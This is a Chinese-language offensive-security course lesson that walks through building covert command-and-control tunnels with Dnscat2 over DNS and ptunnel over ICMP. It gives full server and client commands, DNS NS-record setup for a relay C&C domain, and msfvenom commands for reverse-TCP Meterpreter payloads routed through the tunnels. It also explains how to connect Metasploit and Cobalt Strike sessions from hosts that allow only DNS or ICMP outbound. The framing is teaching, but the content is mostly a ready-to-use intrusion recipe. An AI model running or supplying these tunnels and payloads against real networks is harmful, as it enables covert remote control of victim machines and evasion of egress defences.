#  067：Dnscat2、icmpsh搭建隧道 🛠️

![](img/3357aabe3ef035b1ca65210de75e7e67_0.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_1.png)

## 概述

![](img/3357aabe3ef035b1ca65210de75e7e67_3.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_5.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_7.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_9.png)

在本节课中，我们将学习两种重要的隧道技术：**Dnscat2** 和 **icmpsh**。我们将分别介绍它们的两种工作模式（直连和中继），并通过实际操作演示如何利用这些隧道建立命令控制通道，以应对目标网络环境对特定协议（如TCP/UDP）的限制。

![](img/3357aabe3ef035b1ca65210de75e7e67_11.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_13.png)

---

![](img/3357aabe3ef035b1ca65210de75e7e67_15.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_17.png)

## Dnscat2 隧道技术

![](img/3357aabe3ef035b1ca65210de75e7e67_19.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_21.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_22.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_24.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_25.png)

上一节我们介绍了课程概述，本节中我们来看看 **Dnscat2** 的具体使用。Dnscat2 是一款利用 DNS 协议进行加密通信的隧道工具，常用于在只允许 DNS 流量外出的环境中建立命令控制。

### 直连模式

![](img/3357aabe3ef035b1ca65210de75e7e67_27.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_29.png)

直连模式要求客户端能直接访问服务端的 IP 地址和 53 端口。

![](img/3357aabe3ef035b1ca65210de75e7e67_31.png)

以下是启动服务端的步骤：

1.  进入工具目录并执行启动脚本。
    ```bash
    cd /path/to/dnscat2/server/
    ruby ./dnscat2.rb
    ```
2.  执行后，服务端会监听本地的 UDP 53 端口，并生成一个密钥（`secret`）。客户端连接时需要此密钥。
3.  如果遇到 53 端口被占用（例如被 `systemd-resolved` 服务占用），需要修改相关配置文件以释放该端口。

![](img/3357aabe3ef035b1ca65210de75e7e67_33.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_34.png)

服务端启动后，需要在目标机器（客户端）上执行编译好的客户端程序。

以下是启动客户端的命令示例：
```bash
./dnscat2 --dns server=<SERVER_IP>,port=53 --secret=<SERVER_SECRET>
```
其中 `<SERVER_IP>` 是服务端 IP，`<SERVER_SECRET>` 是服务端生成的密钥字符串。

连接成功后，服务端会显示 `Session established`，并创建一个窗口（`window`）。我们可以通过命令与客户端进行交互。

![](img/3357aabe3ef035b1ca65210de75e7e67_36.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_38.png)

以下是常用的管理命令列表：
*   `windows` 或 `window`：查看当前所有会话窗口。
*   `session -i <id>`：进入指定 ID 的会话窗口。
*   在会话窗口中，可以执行 `shell` 命令来获取一个反向 shell，进而执行系统命令（如 `ls`, `whoami`）。

![](img/3357aabe3ef035b1ca65210de75e7e67_40.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_42.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_44.png)

### 中继模式

![](img/3357aabe3ef035b1ca65210de75e7e67_46.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_48.png)

上一节我们介绍了直连模式，本节中我们来看看中继模式。中继模式通过公网域名进行通信，更适合客户端无法直接连接服务端 IP 的场景。

![](img/3357aabe3ef035b1ca65210de75e7e67_50.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_52.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_54.png)

使用中继模式需要做以下准备：
1.  一台公网服务器（作为C&C服务器）。
2.  一台靶机（内网或公网均可）。
3.  一个可自主配置 DNS 解析的域名。

![](img/3357aabe3ef035b1ca65210de75e7e67_56.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_58.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_60.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_62.png)

配置域名的核心是设置 NS 记录，将特定子域名的解析权指向我们的 C&C 服务器。

![](img/3357aabe3ef035b1ca65210de75e7e67_64.png)

以下是具体的 DNS 解析配置步骤：
1.  添加一条 A 记录，将自定义的 NS 服务器名称（如 `ns.xxx.com`）解析到 C&C 服务器的公网 IP。
2.  添加一条 NS 记录，将用于隧道的子域名（如 `tunnel.xxx.com`）的权威 DNS 服务器指向上一步设置的 NS 服务器名称（`ns.xxx.com`）。

配置完成后，启动服务端时需要指定域名。

服务端启动命令如下：
```bash
ruby ./dnscat2.rb tunnel.xxx.com --secret=MySecret
```
客户端启动时，则使用该域名进行连接。

客户端启动命令如下：
```bash
./dnscat2 --dns domain=tunnel.xxx.com --secret=MySecret
```
其工作原理是：客户端解析 `tunnel.xxx.com` 时，根据 NS 记录找到我们的 C&C 服务器进行解析，从而将 DNS 查询流量导向我们的服务端，建立隧道。

连接建立后的管理与直连模式相同，可以通过 `session` 等命令进行控制。

![](img/3357aabe3ef035b1ca65210de75e7e67_66.png)

---

![](img/3357aabe3ef035b1ca65210de75e7e67_68.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_70.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_72.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_74.png)

## icmpsh 隧道技术

![](img/3357aabe3ef035b1ca65210de75e7e67_76.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_78.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_80.png)

上一节我们完成了 Dnscat2 的学习，本节中我们来看看 **icmpsh** 隧道。当目标环境严格到只允许 ICMP 协议（如 ping）出网时，可以使用 ICMP 隧道工具进行穿透，这里我们介绍 **ptunnel** 工具。

![](img/3357aabe3ef035b1ca65210de75e7e67_82.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_84.png)

### 转发 TCP 流量上线 MSF

![](img/3357aabe3ef035b1ca65210de75e7e67_86.png)

此方法将 TCP 流量封装在 ICMP 隧道中，使 MSF 的 TCP payload 能在仅允许 ICMP 的环境下上线。

![](img/3357aabe3ef035b1ca65210de75e7e67_88.png)

首先，在公网 VPS 上启动 ptunnel 服务端。

![](img/3357aabe3ef035b1ca65210de75e7e67_90.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_92.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_94.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_96.png)

服务端启动命令如下：
```bash
./ptunnel -x MyPassword
```
`-x` 参数指定连接密码。

![](img/3357aabe3ef035b1ca65210de75e7e67_98.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_100.png)

接着，在靶机（客户端）上启动 ptunnel 客户端，并配置端口转发。

![](img/3357aabe3ef035b1ca65210de75e7e67_102.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_104.png)

客户端启动命令如下：
```bash
./ptunnel -p <SERVER_IP> -lp 9999 -da <MSF_SERVER_IP> -dp 7777 -x MyPassword
```
*   `-p`: 服务端 IP。
*   `-lp 9999`: 在客户端本地监听 9999 端口。
*   `-da` 和 `-dp`: 指定最终要转发到的目标地址和端口（即 MSF 监听地址）。
*   `-x`: 与服务端一致的密码。

![](img/3357aabe3ef035b1ca65210de75e7e67_106.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_108.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_110.png)

然后，使用 MSF 生成一个 payload，其反向连接地址设置为靶机本地的 9999 端口。

![](img/3357aabe3ef035b1ca65210de75e7e67_112.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_114.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_116.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_118.png)

生成 Payload 的命令如下：
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<靶机本地IP> LPORT=9999 -f exe -o shell.exe
```
将生成的 `shell.exe` 在靶机上执行。该程序会向 `127.0.0.1:9999` 发起 TCP 连接，该连接被 ptunnel 客户端捕获，通过 ICMP 隧道转发至服务端，再由服务端解密并转发到 MSF 监听的 `7777` 端口，从而成功上线。

![](img/3357aabe3ef035b1ca65210de75e7e67_120.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_122.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_124.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_125.png)

### 转发 Socks5 代理流量上线 MSF

![](img/3357aabe3ef035b1ca65210de75e7e67_127.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_128.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_130.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_132.png)

此方法在靶机上建立一个 Socks5 代理，并将代理流量通过 ICMP 隧道转发出去。

![](img/3357aabe3ef035b1ca65210de75e7e67_134.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_136.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_137.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_139.png)

启动服务端的方式不变。启动客户端时，需启用 Socks5 转发。

![](img/3357aabe3ef035b1ca65210de75e7e67_141.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_143.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_145.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_147.png)

客户端启动命令如下：
```bash
./ptunnel -p <SERVER_IP> -lp 9999 -da <MSF_SERVER_IP> -dp 8888 -x MyPassword -socks5
```
`-socks5` 参数表示在客户端本地 `9999` 端口开启一个 Socks5 代理服务。

接着，使用 MSF 生成 payload 时，需设置代理选项，使其通过靶机本地的 Socks5 代理连接出来。

生成 Payload 的命令如下：
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<MSF_SERVER_IP> LPORT=8888 HttpProxyType=SOCKS5 HttpProxyHost=<靶机本地IP> HttpProxyPort=9999 -f exe -o socks_shell.exe
```
执行此 payload 后，其流量会先进入本地 Socks5 代理（`9999`端口），然后被 ptunnel 通过 ICMP 隧道转发至服务端，最终到达 MSF 监听的 `8888` 端口。

![](img/3357aabe3ef035b1ca65210de75e7e67_149.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_151.png)

### 转发 TCP 流量上线 Cobalt Strike

![](img/3357aabe3ef035b1ca65210de75e7e67_153.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_155.png)

原理与上线 MSF 类似。首先配置 ptunnel 客户端进行端口转发（例如将本地 `8899` 端口转发到 CS 团队服务器的 `7777` 端口）。

![](img/3357aabe3ef035b1ca65210de75e7e67_157.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_159.png)

在 Cobalt Strike 上创建监听器时，`Host` 设置为 `127.0.0.1`，`Port` 设置为 ptunnel 客户端监听的端口（如 `8899`）。`Beacon` 的端口则设置为团队服务器实际监听的端口（如 `7777`）。

![](img/3357aabe3ef035b1ca65210de75e7e67_161.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_163.png)

生成 Beacon 时，其回连地址设置为靶机本地 IP 和 ptunnel 客户端监听端口（`8899`）。执行后，流量即可通过 ICMP 隧道中继至 CS 团队服务器。

---

## 总结

本节课中我们一起学习了两种关键的隧道技术。
*   **Dnscat2** 利用 DNS 查询和响应建立加密隧道，适用于允许 DNS 流量的环境，并掌握了其直连与中继两种模式。
*   **ptunnel** 利用 ICMP 协议封装 TCP 或 Socks5 流量，适用于严格限制下仅允许 ICMP 协议出网的场景，并实践了通过它上线 MSF 和 CS 的方法。

![](img/3357aabe3ef035b1ca65210de75e7e67_165.png)

![](img/3357aabe3ef035b1ca65210de75e7e67_166.png)

这些技术有助于我们在复杂的网络限制条件下，建立稳定的命令控制通道。